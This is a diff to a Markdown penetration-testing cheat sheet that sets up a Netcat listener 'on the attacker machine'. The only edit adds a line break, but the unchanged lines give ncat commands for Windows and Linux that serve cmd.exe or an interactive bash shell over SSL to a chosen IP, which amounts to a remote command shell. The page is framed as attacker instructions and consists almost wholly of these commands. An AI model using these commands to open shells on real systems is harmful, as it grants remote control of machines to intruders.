@@ -1,6 +1,6 @@
 ## Setup a Netcat listener on the attacker machine
 
-Win: `ncat -lvp port -e cmd.exe --allow ip --ssl` 
+Win: `ncat -lvp port -e cmd.exe --allow ip --ssl`  <br>
 Linux: `ncat -lvp port -e '/bin/bash -i' --allow ip --ssl`
 
 where `port` is any port number, and `ip` is the other machine IP.
